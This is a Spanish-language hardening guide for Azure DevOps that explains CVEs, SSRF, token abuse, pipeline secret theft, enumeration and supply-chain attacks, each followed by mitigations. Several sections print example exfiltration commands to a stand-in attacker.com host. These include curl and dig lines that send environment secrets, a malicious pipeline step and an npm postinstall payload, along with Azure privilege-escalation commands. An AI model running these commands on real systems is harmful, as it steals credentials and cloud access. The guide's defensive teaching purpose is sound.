# 🔐 Azure DevOps — Attack Vectors & Hardening Guide

> **Propósito:** Este documento describe los principales vectores de ataque conocidos contra entornos Azure DevOps, cómo funciona cada exploit, y las medidas de mitigación recomendadas. Orientado a equipos de seguridad, DevSecOps y administradores de plataforma.

---

## 📋 Tabla de Contenidos

- [CVEs Críticos](#-cves-críticos)
  - [CVE-2025-29813 — Privilege Escalation (CVSS 10.0)](#cve-2025-29813--privilege-escalation-cvss-100)
  - [CVE-2024-20667 — RCE vía Queue Build](#cve-2024-20667--rce-vía-queue-build)
  - [CVE-2023-36561 — Acceso a Secrets en Pipelines](#cve-2023-36561--acceso-a-secrets-en-pipelines)
- [Vulnerabilidades de Infraestructura](#-vulnerabilidades-de-infraestructura)
  - [SSRF — CRLF Injection](#ssrf--crlf-injection)
  - [SSRF — DNS Rebinding](#ssrf--dns-rebinding)
  - [Azure Service Tags Firewall Bypass](#azure-service-tags-firewall-bypass)
- [Abuso de Credenciales y Secrets](#-abuso-de-credenciales-y-secrets)
  - [Personal Access Token (PAT) Abuse](#personal-access-token-pat-abuse)
  - [Pipeline Secrets Extraction](#pipeline-secrets-extraction)
  - [Service Connection Credentials Theft](#service-connection-credentials-theft)
- [Enumeración y Reconocimiento](#-enumeración-y-reconocimiento)
  - [API Enumeration](#api-enumeration)
  - [Repository Enumeration](#repository-enumeration)
  - [Build Variable Extraction](#build-variable-extraction)
- [Zero-Click CI/CD Vulnerabilities](#-zero-click-cicd-vulnerabilities)
- [Resumen de Controles Prioritarios](#-resumen-de-controles-prioritarios)
- [Referencias](#-referencias)

---

## 🚨 CVEs Críticos

### CVE-2025-29813 — Privilege Escalation (CVSS 10.0)

| Campo | Detalle |
|---|---|
| **CVSS Score** | 10.0 (CRITICAL) |
| **Vector** | Red / Sin autenticación |
| **Afecta** | Azure DevOps Server |
| **Parche** | [Microsoft Security Advisory](https://msrc.microsoft.com/) |

#### ¿Cómo se explota?

Esta vulnerabilidad permite a un atacante con acceso de red al servidor escalar privilegios **sin autenticación previa**. Al enviar una solicitud HTTP especialmente crafteada al endpoint expuesto, el servidor procesa la petición con permisos elevados, otorgando control total sobre la instancia.

Un CVSS de 10.0 implica que:
- ❌ No requiere autenticación
- ❌ No requiere interacción del usuario
- ❌ El impacto es total en Confidencialidad, Integridad y Disponibilidad

#### Mitigación

```bash
# 1. Aplicar el parche de Microsoft de forma inmediata
# 2. Mientras se parchea, restringir acceso de red al servidor
```

- ✅ Aplicar el parche oficial de Microsoft **inmediatamente**
- ✅ Restringir el acceso al puerto del servidor ADO a IPs conocidas con NSG/firewall
- ✅ Colocar un WAF delante del servicio
- ✅ Revisar logs de acceso anteriores para detectar explotación previa

---

### CVE-2024-20667 — RCE vía Queue Build

| Campo | Detalle |
|---|---|
| **CVSS Score** | Alto |
| **Vector** | Autenticado con permiso de bajo privilegio |
| **Afecta** | Azure DevOps Pipelines |
| **Requisito** | Permiso `Queue Build` |

#### ¿Cómo se explota?

Un usuario con permisos de **Queue Build** (considerado de bajo riesgo) puede inyectar comandos maliciosos en el proceso de build para lograr ejecución remota de código en el agente de pipeline.

El permiso de Queue Build se otorga frecuentemente a desarrolladores externos o colaboradores, asumiendo que es inofensivo. Esta vulnerabilidad rompe esa suposición.

#### Mitigación

- ✅ Aplicar el parche de Microsoft
- ✅ Auditar quién tiene permisos de Queue Build en proyectos sensibles
- ✅ Usar agentes efímeros que se destruyen tras cada job

```yaml
# Ejemplo: Pool de agentes efímeros en pipeline
pool:
  name: 'ephemeral-agents'
  demands:
    - Agent.OS -equals Linux
```

- ✅ Implementar aprobaciones manuales antes de ejecutar builds en pipelines críticos

---

### CVE-2023-36561 — Acceso a Secrets en Pipelines

| Campo | Detalle |
|---|---|
| **CVSS Score** | Alto |
| **Vector** | Autenticado con acceso a pipeline |
| **Afecta** | Azure DevOps Pipelines (cross-pipeline) |

#### ¿Cómo se explota?

Permite a un atacante con ciertos permisos en un pipeline **acceder a secrets de otros pipelines** o escalar privilegios dentro del proyecto. Se aprovecha de validaciones incorrectas en el scope de los secrets al ejecutar tareas cross-pipeline.

#### Mitigación

- ✅ Aplicar el parche
- ✅ Separar secrets por pipeline con scopes estrictos
- ✅ Usar Variable Groups con permisos explícitos por pipeline

```yaml
# Configurar permisos de variable group solo para pipelines específicos
# Settings > Pipelines > Library > [Variable Group] > Pipeline permissions
```

- ✅ Nunca compartir service connections entre proyectos sin necesidad real
- ✅ Auditar accesos cross-pipeline periódicamente

---

## 🌐 Vulnerabilidades de Infraestructura

### SSRF — CRLF Injection

#### ¿Cómo se explota?

El atacante inyecta caracteres `\r\n` (Carriage Return + Line Feed) en parámetros de entrada que Azure DevOps usa para construir peticiones HTTP internas.

```
# Payload de ejemplo
https://victim.azuredevops.com/endpoint?url=https://legit.com%0d%0aX-Injected-Header:%20malicious
```

Esto puede resultar en:
- Manipulación de headers HTTP
- HTTP Response Splitting
- Cache poisoning
- Session hijacking si el header contiene cookies

#### Mitigación

- ✅ Validar y sanitizar todas las URLs de entrada — rechazar `%0d`, `%0a`, `\r`, `\n`
- ✅ Implementar una allowlist estricta de dominios permitidos
- ✅ Configurar egress filtering en agentes para limitar destinos externos

```python
# Ejemplo de validación básica en Python
import re
from urllib.parse import urlparse

def validate_url(url: str) -> bool:
    parsed = urlparse(url)
    # Rechazar si contiene CRLF
    if re.search(r'[\r\n]', url):
        return False
    # Solo permitir dominios en allowlist
    allowed_domains = ['api.github.com', 'registry.npmjs.org']
    return parsed.netloc in allowed_domains
```

---

### SSRF — DNS Rebinding

#### ¿Cómo se explota?

El atacante registra un dominio controlado que **inicialmente resuelve a una IP legítima** (pasando validaciones), pero tras expirar el TTL, redirige a una IP interna como el endpoint de metadata de Azure:

```
169.254.169.254  →  Azure Instance Metadata Service (IMDS)
```

**Flujo del ataque:**
1. Atacante registra `evil.com` → resuelve a `1.2.3.4` (IP pública válida)
2. Pipeline hace validación: `1.2.3.4` es pública, ✅ permitida
3. TTL expira, atacante cambia DNS: `evil.com` → `169.254.169.254`
4. Pipeline reutiliza la sesión y hace request al IMDS
5. Atacante obtiene el token de identidad del agente

#### Mitigación

- ✅ Bloquear resolución de IPs privadas/RFC1918 y link-local desde agentes

```bash
# Bloquear acceso al IMDS desde agentes que no lo necesiten
# En el agente (iptables)
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

- ✅ Implementar TTL mínimo en validaciones de DNS (re-resolver antes de cada request)
- ✅ Usar egress proxies con filtrado de destino

---

### Azure Service Tags Firewall Bypass

#### ¿Cómo se explota?

Azure permite usar **Service Tags** como `AzureDevOps` en reglas de firewall para "confiar en tráfico de Azure DevOps". El problema: estas tags incluyen **rangos de IPs compartidos con todos los tenants de Azure**.

Un atacante con cualquier recurso en Azure puede originar tráfico desde esas IPs y **bypassear el firewall**, porque la regla confía en el tag completo, no en tu tenant específico.

```
# Regla vulnerable
Source: ServiceTag/AzureDevOps  →  Destination: Your API  →  Action: ALLOW
# Un atacante en Azure también tiene IPs dentro de esa Service Tag
```

#### Mitigación

- ✅ **No usar Service Tags como único control de acceso**
- ✅ Agregar autenticación mutua (mTLS) sobre la regla de firewall
- ✅ Incluir tokens de autenticación en las llamadas
- ✅ Tratar las Service Tags como "hint de routing", no como control de seguridad

```bicep
// Regla de ejemplo: Service Tag + autenticación adicional
resource networkRule 'Microsoft.Network/firewallPolicies/ruleCollectionGroups@2023-04-01' = {
  // La Service Tag es solo la primera capa; siempre agregar auth en la app
}
```

> 📖 **Referencia:** [Research: Bypassing Azure Firewall with Service Tags](https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/)

---

## 🔑 Abuso de Credenciales y Secrets

### Personal Access Token (PAT) Abuse

#### ¿Cómo se explota?

Los PATs son credenciales de **larga duración** con scopes amplios. Vectores de compromiso más comunes:

| Vector | Descripción |
|---|---|
| Hardcoded en repos | PAT commiteado en código fuente o config files |
| Filtrado en logs | PAT impreso en output de pipeline |
| Scope excesivo | PAT con permisos de admin cuando solo necesita read |
| Sin expiración | PATs que nunca expiran permiten acceso indefinido |

Una vez comprometido, el atacante puede operar silenciosamente como el usuario legítimo:

```bash
# Un atacante con un PAT puede enumerar toda la organización
curl -u ":STOLEN_PAT" \
  "https://dev.azure.com/{org}/_apis/projects?api-version=7.1"
```

#### Mitigación

```bash
# Detectar PATs en código con gitleaks
gitleaks detect --source . --verbose

# O con trufflehog
trufflehog git file://. --only-verified
```

- ✅ Establecer expiración máxima de **90 días** en PATs
- ✅ Auditar PATs activos: `Organization Settings > Personal Access Tokens`
- ✅ Usar **Managed Identities** en lugar de PATs para autenticación service-to-service
- ✅ Implementar secret scanning automático en todos los repos
- ✅ Restringir scopes de PATs al mínimo necesario (`Code: Read` si solo lee, etc.)
- ✅ Revocar PATs inmediatamente al offboarding de empleados

---

### Pipeline Secrets Extraction

#### ¿Cómo se explota?

Si un atacante puede ejecutar código en un pipeline (por PR malicioso, dependencia comprometida, etc.), puede extraer secrets de las variables de entorno del agente:

```bash
# Métodos de exfiltración desde un step malicioso

# Método 1: Variables de entorno directas
env | curl -X POST https://attacker.com/collect -d @-

# Método 2: Base64 encoded
curl "https://attacker.com/?d=$(env | base64 -w0)"

# Método 3: Variable específica
curl "https://attacker.com/?secret=$(echo $MY_SECRET_VAR)"

# Método 4: DNS exfiltration (más silencioso)
dig $(echo $SECRET | base64).attacker.com
```

> ⚠️ **Importante:** Marcar una variable como "secret" en ADO solo la **enmascara en logs**, pero el proceso del agente sigue recibiéndola como variable de entorno normal.

#### Mitigación

- ✅ Habilitar **Protected resources** — requieren aprobación manual para pipelines de forks
- ✅ Usar **Azure Key Vault** con Managed Identity en lugar de variables de pipeline para secrets críticos

```yaml
# Acceder a Key Vault en pipeline de forma segura
steps:
- task: AzureKeyVault@2
  inputs:
    azureSubscription: 'MyServiceConnection'
    KeyVaultName: 'my-keyvault'
    SecretsFilter: 'MY-SECRET'
    RunAsPreJob: true
```

- ✅ Implementar **Approvals and Checks** en environments y service connections
- ✅ Nunca exponer secrets en pipelines triggered por PRs externos (forks)
- ✅ Auditar qué variables se loggean y aplicar `issecret=true`

```bash
# En scripts de pipeline, marcar outputs como secret
echo "##vso[task.setvariable variable=mySecret;issecret=true]$(cat secret.txt)"
```

---

### Service Connection Credentials Theft

#### ¿Cómo se explota?

Las service connections almacenan credenciales (Service Principal, certificados, tokens) para conectarse a Azure, AWS, Kubernetes, etc. Si código malicioso se ejecuta en un pipeline con acceso a una service connection, puede:

```bash
# Usando az cli disponible en el agente con las credenciales inyectadas
az account list  # Listar subscriptions accesibles
az storage account list  # Exfiltrar datos de storage
az role assignment create --role Owner  # Escalar privilegios en Azure
```

El impacto va **más allá de Azure DevOps** — afecta directamente a los recursos en Azure/cloud.

#### Mitigación

- ✅ Aplicar **Pipeline permissions** en cada service connection (solo pipelines específicos)
- ✅ Usar **Workload Identity Federation (OIDC)** en lugar de secrets estáticos

```yaml
# Service connection con OIDC — emite tokens efímeros sin credenciales almacenadas
- task: AzureCLI@2
  inputs:
    azureSubscription: 'MyOIDCServiceConnection'  # OIDC, no SP secret
    scriptType: 'bash'
    scriptLocation: 'inlineScript'
    inlineScript: 'az account show'
```

- ✅ Implementar **Approvals and Checks** para requerir aprobación humana antes de usar service connections críticas
- ✅ Auditar el uso de service connections en `Project Settings > Service connections > Usage history`
- ✅ Aplicar el principio de mínimo privilegio en los permisos del Service Principal

---

## 🔍 Enumeración y Reconocimiento

### API Enumeration

#### ¿Cómo se explota?

La API REST de Azure DevOps es extremadamente completa. Con un token de bajo privilegio, un atacante puede mapear toda la organización:

```bash
# Endpoints de reconocimiento clave

# 1. Listar todos los proyectos
curl -u ":TOKEN" "https://dev.azure.com/{org}/_apis/projects?api-version=7.1"

# 2. Listar pipelines y sus variables
curl -u ":TOKEN" "https://dev.azure.com/{org}/{project}/_apis/build/definitions?api-version=7.1"

# 3. Listar service connections
curl -u ":TOKEN" "https://dev.azure.com/{org}/{project}/_apis/serviceendpoint/endpoints?api-version=7.1"

# 4. Listar usuarios y grupos
curl -u ":TOKEN" "https://vssps.dev.azure.com/{org}/_apis/graph/users?api-version=7.1-preview.1"

# 5. Listar variable groups (potenciales secrets)
curl -u ":TOKEN" "https://dev.azure.com/{org}/{project}/_apis/distributedtask/variablegroups?api-version=7.1"
```

#### Mitigación

- ✅ Configurar proyectos como **Private** (no Public ni Organization-visible innecesariamente)
- ✅ Habilitar **Conditional Access Policies** con Azure AD para el acceso a la API
- ✅ Implementar monitoreo de llamadas anómalas a la API con Microsoft Defender for DevOps o SIEM
- ✅ Limitar scopes de PATs y tokens de acceso

---

### Repository Enumeration

#### ¿Cómo se explota?

Con acceso básico de lectura, un atacante puede enumerar todos los repositorios y buscar:
- Secrets hardcoded en el historial de commits
- Archivos de configuración con credenciales
- Patrones de infraestructura para planear ataques posteriores

```bash
# Listar repos
curl -u ":TOKEN" "https://dev.azure.com/{org}/{project}/_apis/git/repositories?api-version=7.1"

# Buscar en el historial de commits (desde local)
git log --all --full-history -- "**/*.env"
git log --all -p --follow -- "config.json" | grep -i "password\|secret\|key"
```

#### Mitigación

- ✅ Implementar **branch policies** y revisión de código obligatoria
- ✅ Activar **secret scanning** (GitHub Advanced Security for ADO o gitleaks en pre-commit hooks)
- ✅ Usar `.gitignore` apropiados y nunca commitear archivos `.env`, `*.key`, `*.pem`
- ✅ Hacer **git history rewrite** si se detectan secrets en el historial

```bash
# Remoción de secrets del historial con git-filter-repo (recomendado sobre BFG)
pip install git-filter-repo
git filter-repo --path-glob '*.env' --invert-paths
```

---

### Build Variable Extraction

#### ¿Cómo se explota?

Las variables predefinidas de Azure DevOps exponen información del entorno. La más crítica es `System.AccessToken`:

```bash
# Variables predefinidas con información sensible
echo "Build ID: $(Build.BuildId)"
echo "Source Branch: $(Build.SourceBranch)"
echo "Agent Dir: $(Agent.WorkFolder)"

# System.AccessToken — si se habilita, permite llamadas a la API ADO
curl -H "Authorization: Bearer $(System.AccessToken)" \
  "https://dev.azure.com/{org}/{project}/_apis/build/definitions?api-version=7.1"
```

Si el Build Service Account tiene permisos amplios, este token puede usarse para modificar pipelines, leer otros repos, o acceder a service connections.

#### Mitigación

```yaml
# Solo habilitar System.AccessToken cuando sea estrictamente necesario
# y con el scope mínimo
env:
  SYSTEM_ACCESSTOKEN: $(System.AccessToken)

# Configurar permisos del Build Service Account en:
# Project Settings > Repositories > Security > [Project] Build Service
```

- ✅ Limitar los permisos del **Project Build Service Account** al mínimo
- ✅ No habilitar `System.AccessToken` por defecto — solo para pipelines que lo necesiten
- ✅ Auditar qué variables se imprimen en los logs de pipeline

---

## ⚡ Zero-Click CI/CD Vulnerabilities

#### ¿Cómo se explotan?

Son los ataques más peligrosos porque **no requieren interacción de un usuario privilegiado**. El trigger es automático.

**Escenario 1 — PR malicioso en repositorio público:**

```yaml
# Un atacante hace un fork y modifica azure-pipelines.yml
# Si el pipeline tiene trigger en PRs de forks:
trigger:
  - main
pr:
  - main  # ← Este trigger ejecuta código del atacante automáticamente

steps:
- script: |
    # Este código del atacante se ejecuta con acceso a secrets
    curl "https://attacker.com/$(MY_SECRET)"
```

**Escenario 2 — Dependency Confusion / Supply Chain:**

```json
// package.json del proyecto víctima
{
  "dependencies": {
    "internal-utils": "1.0.0"  // Paquete interno
  }
}
```

```javascript
// El atacante publica "internal-utils" en npm público con versión mayor
// Durante npm install, se descarga el paquete malicioso
// postinstall script:
process.env && require('https').get(`https://attacker.com/?d=${Buffer.from(JSON.stringify(process.env)).toString('base64')}`)
```

**Escenario 3 — Typosquatting:**
```
requests  →  requestss  (typo en requirements.txt)
lodash    →  lodahs     (typo en package.json)
```

#### Mitigación

```yaml
# 1. Deshabilitar ejecución automática en PRs de forks
pr:
  autoCancel: true
  drafts: false
  # Requiere aprobación manual via comentario
```

- ✅ Usar **Comment trigger** — requerir que un maintainer comente `/azp run` antes de ejecutar

```yaml
# En ADO: Configurar "Build validation" con "Require a team member's comment before building"
# Project Settings > Repositories > Policies > [Branch] > Build Validation
```

- ✅ Separar pipelines de CI público (sin secrets) de pipelines de CD (con secrets)
- ✅ Implementar **verificación de integridad de dependencias**

```bash
# npm — usar lockfile y verificar integridad
npm ci  # En lugar de npm install (respeta package-lock.json)

# Python — usar hashes en requirements
pip install --require-hashes -r requirements.txt

# Verificar con pip-audit
pip-audit
```

- ✅ Configurar **allowlists de registros** de paquetes para evitar dependency confusion

```yaml
# .npmrc — apuntar paquetes internos al registry privado
@internal:registry=https://pkgs.dev.azure.com/{org}/_packaging/{feed}/npm/registry/
```

- ✅ Usar **Protected branches** con Required reviewers en environments de producción

---

## ✅ Resumen de Controles Prioritarios

Ordenados por impacto y facilidad de implementación:

| Prioridad | Control | Impacto | Esfuerzo |
|---|---|---|---|
| 🔴 **1** | Parchear CVE-2025-29813 (CVSS 10.0) | Crítico | Bajo |
| 🔴 **2** | Workload Identity Federation (OIDC) en service connections | Alto | Medio |
| 🔴 **3** | Deshabilitar fork PR triggers en pipelines con secrets | Alto | Bajo |
| 🟠 **4** | Agentes efímeros — no reutilizar entre proyectos | Alto | Medio |
| 🟠 **5** | Protected resources con Approvals and Checks | Alto | Bajo |
| 🟠 **6** | Secret scanning automático en todos los repos | Medio | Bajo |
| 🟡 **7** | Rotación de PATs + expiración máxima 90 días | Medio | Bajo |
| 🟡 **8** | Conditional Access Policies con Azure AD | Medio | Medio |
| 🟡 **9** | Monitoreo de API con Defender for DevOps o SIEM | Medio | Alto |
| 🟢 **10** | Auditoría periódica de permisos y service connections | Preventivo | Bajo |

---

## 📚 Referencias

| Recurso | URL |
|---|---|
| Microsoft Security Response Center | https://msrc.microsoft.com/ |
| Azure DevOps Security Best Practices | https://learn.microsoft.com/en-us/azure/devops/organizations/security/security-best-practices |
| Workload Identity Federation | https://learn.microsoft.com/en-us/azure/devops/pipelines/library/connect-to-azure?view=azure-devops#create-an-azure-resource-manager-service-connection-using-workload-identity-federation |
| Pipeline Security | https://learn.microsoft.com/en-us/azure/devops/pipelines/security/overview |
| Defender for DevOps | https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-devops-introduction |
| NVD — CVE-2025-29813 | https://nvd.nist.gov/vuln/detail/CVE-2025-29813 |
| NVD — CVE-2024-20667 | https://nvd.nist.gov/vuln/detail/CVE-2024-20667 |
| NVD — CVE-2023-36561 | https://nvd.nist.gov/vuln/detail/CVE-2023-36561 |
| OWASP CI/CD Security Top 10 | https://owasp.org/www-project-top-10-ci-cd-security-risks/ |
| gitleaks (Secret Scanner) | https://github.com/gitleaks/gitleaks |
| git-filter-repo | https://github.com/newren/git-filter-repo |

---

> **Disclaimer:** Este documento es de carácter educativo y defensivo. La información aquí contenida debe usarse exclusivamente para proteger sistemas propios o en los que se tenga autorización explícita para realizar pruebas de seguridad.
